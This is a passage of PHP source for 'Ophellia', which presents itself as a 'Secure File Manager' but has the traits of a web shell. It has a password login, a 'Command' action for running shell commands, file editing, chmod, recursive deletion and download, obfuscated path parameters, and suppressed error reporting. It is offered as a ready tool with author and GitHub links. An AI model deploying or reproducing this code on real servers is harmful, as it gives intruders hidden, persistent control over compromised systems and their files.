    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>Cancel</a>';
    echo '</div>';
    echo '</form>';
    
    echo '</div>';
    echo '</div>';
}

function chmodFile(string $file): void {
    $dirname = dirname($file);
    
    if (isset($_POST['permission'])) {
        if (!preg_match('/^[0-7]{3,4}$/', $_POST['permission'])) {
            showAlert("Invalid permission format!", "error");
            displayChmodForm($file);
            return;
        }
        
        $permission = octdec($_POST['permission']);
        chmod($file, $permission);
        
        // Reset POST data and show file manager
        $_POST = array();
        showAlert("Permissions changed successfully!", "success");
        fileManager($dirname);
        return;
    }
    
    displayChmodForm($file);
}

function displayChmodForm(string $file): void {
    $dirname = dirname($file);
    $isDir = is_dir($file);
    $currentPerms = substr(sprintf('%o', fileperms($file)), -4);
    
    echo '<div class="container mx-auto p-4">';
    echo '<div class="bg-white rounded-lg shadow-md p-6">';
    echo '<h2 class="text-xl font-bold mb-4 text-indigo-800 flex items-center">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>';
    echo 'Change Permissions</h2>';
    
    echo '<p class="mb-2 text-gray-600">File: <span class="font-medium">' . htmlspecialchars(basename($file)) . '</span></p>';
    echo '<p class="mb-4 text-gray-600">Current permissions: <span class="font-mono font-medium">' . $currentPerms . '</span></p>';
    
    echo '<form method="post">';
    echo '<div class="mb-4">';
    echo '<label class="block text-gray-700 font-medium mb-2">New Permissions (octal):</label>';
    echo '<input type="text" name="permission" value="' . $currentPerms . '" class="w-full p-2 border border-gray-300 rounded-lg font-mono focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500" required pattern="[0-7]{3,4}" placeholder="e.g. 0755">';
    echo '</div>';
    
    // Permission explanation
    echo '<div class="mb-4 p-3 bg-gray-50 border border-gray-200 rounded-lg text-xs">';
    echo '<p class="font-medium mb-1">Common permissions:</p>';
    echo '<ul class="space-y-1">';
    echo '<li><span class="font-mono">0755</span> - Directory: drwxr-xr-x</li>';
    echo '<li><span class="font-mono">0644</span> - File: -rw-r--r--</li>';
    echo '<li><span class="font-mono">0777</span> - Full access: drwxrwxrwx</li>';
    echo '</ul>';
    echo '</div>';
    
    echo '<div class="flex flex-wrap gap-2">';
    echo '<button type="submit" class="flex items-center px-4 py-2 bg-indigo-600 text-white rounded-lg hover:bg-indigo-700 transition-colors">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>Change</button>';
    
    echo '<a href="?cd=' . encryptPath($dirname) . '" class="flex items-center px-4 py-2 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition-colors">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>Cancel</a>';
    echo '</div>';
    echo '</form>';
    
    echo '</div>';
    echo '</div>';
}

function deleteFile(string $file): bool {
    $isDir = is_dir($file);
    
    if ($isDir) {
        // For directories, try to remove recursively
        $success = deleteDirectory($file);
    } else {
        // For files, simply unlink
        $success = @unlink($file);
    }
    
    return $success;
}

function deleteDirectory(string $dir): bool {
    if (!is_dir($dir)) {
        return false;
    }
    
    $objects = scandir($dir);
    foreach ($objects as $object) {
        if ($object !== '.' && $object !== '..') {
            $path = $dir . DIRECTORY_SEPARATOR . $object;
            if (is_dir($path)) {
                deleteDirectory($path);
            } else {
                @unlink($path);
            }
        }
    }
    
    return @rmdir($dir);
}

function fileManager(string $dir): void {
    echo '<div id="file-manager-content">';
    echo renderFileTable($dir);
    echo '</div>';
}

session_start();
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '256M');

// Handle AJAX delete request
if (isset($_POST['ajax_delete'])) {
    if (authenticate()) {
        $file = decryptPath($_POST['path']);
        $dirname = dirname($file);
        $isDir = is_dir($file);
        $success = deleteFile($file);
        
        $message = ($isDir ? "Directory" : "File") . ($success ? " deleted successfully" : " deletion failed");
        
        // Return JSON response with updated file table HTML
        header('Content-Type: application/json');
        echo json_encode([
            'success' => $success,
            'message' => $message,
            'fileTableHtml' => renderFileTable($dirname)
        ]);
    } else {
        header('Content-Type: application/json');
        echo json_encode([
            'success' => false,
            'message' => 'Authentication failed'
        ]);
    }
    exit;
}

// Handle download
if (isset($_GET['download'])) {
    $file = decryptPath($_GET['download']);
    downloadFile($file);
    exit;
}

if (!authenticate()) {
    echo '<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Authentication</title>
        <script src="https://cdn.tailwindcss.com"></script>
    </head>
    <body class="bg-gradient-to-r from-indigo-500 to-purple-600 flex items-center justify-center min-h-screen">
        <div class="bg-white p-8 rounded-lg shadow-xl w-96 max-w-md">
            <div class="text-center mb-8">
                <h1 class="text-3xl font-bold text-indigo-700 mb-2">Ophellia ' . VERSION . '</h1>
                <p class="text-gray-500">Secure File Manager</p>
            </div>
            
            <form method="post" action="">
                <div class="mb-5">
                    <label for="password" class="block text-gray-700 font-medium mb-2">Password</label>
                    <div class="relative">
                        <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                            <svg class="h-5 w-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                            </svg>
                        </div>
                        <input type="password" id="password" name="password" class="pl-10 w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500" placeholder="Enter password" autofocus>
                    </div>
                </div>
                <button type="submit" class="w-full bg-indigo-600 text-white py-3 rounded-lg hover:bg-indigo-700 transition-colors flex items-center justify-center">
                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 16l-4-4m0 0l4-4m-4 4h14m-5 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h7a3 3 0 013 3v1"></path>
                    </svg>
                    Login
                </button>
            </form>
            
            <div class="mt-6 text-center text-sm text-gray-500">
                <p>© ' . date('Y') . ' Ophellia File Manager</p>
            </div>
        </div>
    </body>
    </html>';
    exit;
}

$currentDir = isset($_GET['cd']) ? decryptPath($_GET['cd']) : getcwd();
if (!file_exists($currentDir) || !is_dir($currentDir)) {
    $currentDir = getcwd();
}

$currentUser = getCurrentUser();
$currentTime = date('Y-m-d H:i:s');

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ophellia <?= VERSION ?></title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .alert-container {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1000;
            max-width: 400px;
            width: auto;
        }
        .alert {
            margin-bottom: 10px;
            padding: 15px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            display: flex;
            justify-content: space-between;
            align-items: center;
            animation: slideIn 0.3s ease-out;
        }
        .alert-success {
            background-color: #d1fae5;
            border-left: 4px solid #10b981;
            color: #065f46;
        }
        .alert-error {
            background-color: #fee2e2;
            border-left: 4px solid #ef4444;
            color: #991b1b;
        }
        .close-alert {
            cursor: pointer;
            font-weight: bold;
            font-size: 18px;
            margin-left: 15px;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.5);
            z-index: 100;
            overflow: auto;
            animation: fadeIn 0.3s ease-out;
        }
        .modal-content {
            background-color: #fff;
            margin: 10% auto;
            padding: 24px;
            border-radius: 12px;
            max-width: 500px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            animation: slideDown 0.3s ease-out;
        }
        @keyframes slideIn {
            from {
                transform: translateX(100%);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
        @keyframes fadeOut {
            from {
                opacity: 1;
            }
            to {
                opacity: 0;
            }
        }
        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }
        @keyframes slideDown {
            from {
                transform: translateY(-50px);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }
        .overflow-x-auto::-webkit-scrollbar {
            height: 6px;
        }
        .overflow-x-auto::-webkit-scrollbar-track {
            background: #f1f1f1;
        }
        .overflow-x-auto::-webkit-scrollbar-thumb {
            background: #888;
            border-radius: 3px;
        }
        .overflow-x-auto::-webkit-scrollbar-thumb:hover {
            background: #555;
        }
        .path-navigator {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
        }
        .fade-edges {
            position: relative;
        }
        .fade-edges::before {
            content: "";
            position: absolute;
            left: 0;
            top: 0;
            width: 20px;
            height: 100%;
            background: linear-gradient(to right, white, transparent);
            z-index: 1;
        }
        .fade-edges::after {
            content: "";
            position: absolute;
            right: 0;
            top: 0;
            width: 20px;
            height: 100%;
            background: linear-gradient(to left, white, transparent);
            z-index: 1;
        }
    </style>
</head>
<body class="bg-gray-100 min-h-screen flex flex-col">
    <!-- Alert Container -->
    <div id="alertContainer" class="alert-container"></div>
    
    <!-- Delete Confirmation Modal -->
    <div id="deleteModal" class="modal">
        <div class="modal-content">
            <h2 id="deleteModalTitle" class="text-xl font-bold mb-4 text-rose-600 flex items-center">
                <svg class="h-6 w-6 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
                </svg>
                <span>Delete Confirmation</span>
            </h2>
            <p id="deleteModalMessage" class="mb-4 text-gray-700"></p>
            <div id="deleteModalWarning" class="mb-4 p-3 bg-rose-50 text-rose-700 border border-rose-200 rounded-lg hidden">
                <div class="flex">
                    <svg class="h-5 w-5 mr-2 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
                    </svg>
                    <span>Warning: This will recursively delete all contents of the directory!</span>
                </div>
            </div>
            <div class="flex space-x-2">
                <button id="confirmDelete" class="flex items-center px-4 py-2 bg-rose-600 text-white rounded-lg hover:bg-rose-700 transition-colors">
                    <svg class="h-5 w-5 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
                    </svg>
                    Delete
                </button>
                <button id="cancelDelete" class="flex items-center px-4 py-2 bg-gray-500 text-white rounded-lg hover:bg-gray-600 transition-colors">
                    <svg class="h-5 w-5 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                    </svg>
                    Cancel
                </button>
            </div>
            <input type="hidden" id="deleteFilePath" value="">
        </div>
    </div>
    
    <!-- Header -->
    <header class="bg-gradient-to-r from-indigo-700 to-purple-700 text-white shadow-md">
        <div class="container mx-auto px-4 py-3">
            <div class="flex flex-col md:flex-row justify-between items-start md:items-center">
                <div class="flex items-center">
                    <div class="mr-6">
                        <h1 class="text-xl font-bold flex items-center">
                            <svg class="h-6 w-6 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
                            </svg>
                            Ophellia <?= VERSION ?>
                        </h1>
                    </div>
                    <div class="hidden md:flex space-x-4">
                        <a href="?cd=<?= encryptPath(getcwd()) ?>" class="hover:text-indigo-200 transition-colors flex items-center">
                            <svg class="h-5 w-5 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"></path>
                            </svg>
                            Home
                        </a>
                    </div>
                </div>
                <div class="mt-2 md:mt-0 text-sm">
                    <div class="flex items-center mb-1">
                        <svg class="h-4 w-4 mr-1 text-indigo-200" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                        </svg>
                        <span><?= $currentTime ?></span>
                    </div>
                    <div class="flex items-center">
                        <svg class="h-4 w-4 mr-1 text-indigo-200" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
                        </svg>
                        <span><?= htmlspecialchars($currentUser) ?></span>
                    </div>
                </div>
            </div>
        </div>
    </header>
    
    <!-- Main Content -->
    <div class="flex-grow">
        <div class="container mx-auto px-4 py-6">
            <!-- Directory Navigator -->
            <div class="bg-white rounded-lg shadow-md p-4 mb-6">
                <div class="mb-3">
                    <h2 class="text-lg font-medium text-gray-800 mb-2 flex items-center">
                        <svg class="h-5 w-5 mr-2 text-indigo-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"></path>
                        </svg>
                        Current Directory
                    </h2>
                    <div class="fade-edges overflow-x-auto">
                        <div class="path-navigator text-sm py-1 px-2 bg-gray-50 rounded-md border border-gray-200">
                            <?= breadcrumbPath($currentDir) ?>
                        </div>
                    </div>
                </div>
                
                <div class="flex flex-wrap gap-2">
                    <a href="?action=newfile&path=<?= encryptPath($currentDir) ?>" class="flex items-center px-3 py-1.5 bg-emerald-600 text-white rounded-md hover:bg-emerald-700 transition-colors">
                        <svg class="h-4 w-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v3m0 0v3m0-3h3m-3 0H9m12 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                        </svg>
                        New File
                    </a>
                    <a href="?action=newfolder&path=<?= encryptPath($currentDir) ?>" class="flex items-center px-3 py-1.5 bg-indigo-600 text-white rounded-md hover:bg-indigo-700 transition-colors">
                        <svg class="h-4 w-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 13h6m-3-3v6m-9-6h.01M19 13h.01M19 19h.01M5 19h.01M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
                        </svg>
                        New Folder
                    </a>
                    <a href="?action=command&path=<?= encryptPath($currentDir) ?>" class="flex items-center px-3 py-1.5 bg-violet-600 text-white rounded-md hover:bg-violet-700 transition-colors">
                        <svg class="h-4 w-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
                        </svg>
                        Command
                    </a>
                </div>
            </div>
            
            <!-- Main Content Area -->
            <div class="bg-white rounded-lg shadow-md p-4">
                <?php
                if (isset($_GET['action'])) {
                    switch ($_GET['action']) {
                        case 'view':
                            if (isset($_GET['file'])) {
                                viewFile(decryptPath($_GET['file']));
                            }
                            break;
                        case 'edit':
                            if (isset($_GET['file'])) {
                                editFile(decryptPath($_GET['file']));
                            }
                            break;
                        case 'newfile':
                            if (isset($_GET['path'])) {
                                newFile(decryptPath($_GET['path']));
                            }
                            break;
                        case 'newfolder':
                            if (isset($_GET['path'])) {
                                newFolder(decryptPath($_GET['path']));
                            }
                            break;
                        case 'command':
                            if (isset($_GET['path'])) {
                                commandLine(decryptPath($_GET['path']));
                            }
                            break;
                        case 'rename':
                            if (isset($_GET['file'])) {
                                renameFile(decryptPath($_GET['file']));
                            }
                            break;
                        case 'chmod':
                            if (isset($_GET['file'])) {
                                chmodFile(decryptPath($_GET['file']));
                            }
                            break;
                        default:
                            fileManager($currentDir);
                    }
                } else {
                    fileManager($currentDir);
                }
                ?>
            </div>
        </div>
    </div>
    
    <!-- Footer -->
    <footer class="bg-gray-800 text-gray-300 py-4 mt-auto">
        <div class="container mx-auto px-4 text-center">
            <div class="flex flex-col md:flex-row justify-between items-center">
                <div>
                    <p class="ftext-sm">
                        <a href="https://rei.my.id">@elliottophellia</a>
                    </p>
                </div>
                <div>
                    <p class="text-sm">
                        <a href="https://t.me/elliottophellia">Contact</a> | <a href="https://github.com/elliottophellia/ophellia">GitHub</a>
                    </p>
                </div>
            </div>
        </div>
    </footer>

    <script>
        // Alert management
        let alertCounter = 0;
        
        function showAlert(message, type) {
            const alertContainer = document.getElementById('alertContainer');
            const alertId = `alert-${alertCounter++}`;
            
            const alertClass = type === 'success' ? 'alert-success' : 'alert-error';
            const iconPath = type === 'success' 
                ? '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>'
                : '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>';
            
            const alertElement = document.createElement('div');
            alertElement.className = `alert ${alertClass}`;
            alertElement.id = alertId;
            
            alertElement.innerHTML = `
                <div class="flex items-center">
                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        ${iconPath}
                    </svg>
                    <div>${message}</div>
                </div>
                <span class="close-alert" onclick="closeAlert('${alertId}')">&times;</span>
            `;
            
            alertContainer.appendChild(alertElement);
            
            // Auto-close after 5 seconds
            setTimeout(() => {
                closeAlert(alertId);
            }, 5000);
        }
        
        function closeAlert(alertId) {
            const alertElement = document.getElementById(alertId);
            if (alertElement) {
                alertElement.style.animation = 'fadeOut 0.3s ease-out';
                setTimeout(() => {
                    alertElement.remove();
                }, 300);
            }
        }
        
        // Delete modal functionality
        function showDeleteModal(filename, filePath, isDirectory) {
            const modal = document.getElementById('deleteModal');
            const title = document.getElementById('deleteModalTitle');
            const message = document.getElementById('deleteModalMessage');
            const warning = document.getElementById('deleteModalWarning');
            const filePathInput = document.getElementById('deleteFilePath');
            
            title.innerHTML = `
                <svg class="h-6 w-6 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
                </svg>
                <span>Delete ${isDirectory ? 'Directory' : 'File'}</span>
            `;
            
            message.textContent = `Are you sure you want to delete "${filename}"? This action cannot be undone.`;
            filePathInput.value = filePath;
            
            if (isDirectory) {
                warning.classList.remove('hidden');
            } else {
                warning.classList.add('hidden');
            }
            
            modal.style.display = 'block';
        }
        
        document.getElementById('confirmDelete').addEventListener('click', function() {
            const filePath = document.getElementById('deleteFilePath').value;
            const modal = document.getElementById('deleteModal');
            
            // Show loading state
            this.innerHTML = `
                <svg class="animate-spin h-5 w-5 mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
                Processing...
            `;
            this.disabled = true;
            
            // Use fetch API to send the delete request
            fetch(window.location.href, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `ajax_delete=1&path=${filePath}`
            })
            .then(response => response.json())
            .then(data => {
                modal.style.display = 'none';
                
                if (data.success) {
                    // Update the file table with the new HTML
                    document.getElementById('file-manager-content').innerHTML = data.fileTableHtml;
                    showAlert(data.message, "success");
                } else {
                    showAlert("Failed to delete: " + data.message, "error");
                }
                
                // Reset button state
                this.innerHTML = `
                    <svg class="h-5 w-5 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
                    </svg>
                    Delete
                `;
                this.disabled = false;
            })
            .catch(error => {
                modal.style.display = 'none';
                showAlert("Error: " + error, "error");
                
                // Reset button state
                this.innerHTML = `
                    <svg class="h-5 w-5 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
                    </svg>
                    Delete
                `;
                this.disabled = false;
            });
        });
        
        document.getElementById('cancelDelete').addEventListener('click', function() {
            document.getElementById('deleteModal').style.display = 'none';
        });
        
        // Close modal if clicked outside
        window.addEventListener('click', function(event) {
            const modal = document.getElementById('deleteModal');
            if (event.target === modal) {
                modal.style.display = 'none';
            }
        });
        
        // Display all stored alerts once the page is loaded
        document.addEventListener('DOMContentLoaded', function() {
            <?php
            // Output the JavaScript code to show all buffered alerts
            foreach ($alertMessages as $alert) {
                echo "showAlert('" . addslashes($alert['message']) . "', '" . $alert['type'] . "');\n";
            }
            ?>
            
            // Add keyboard shortcut for escape key to close modal
            document.addEventListener('keydown', function(event) {
                if (event.key === 'Escape') {
                    document.getElementById('deleteModal').style.display = 'none';
                }
            });
        });
    </script>
</body>
</html>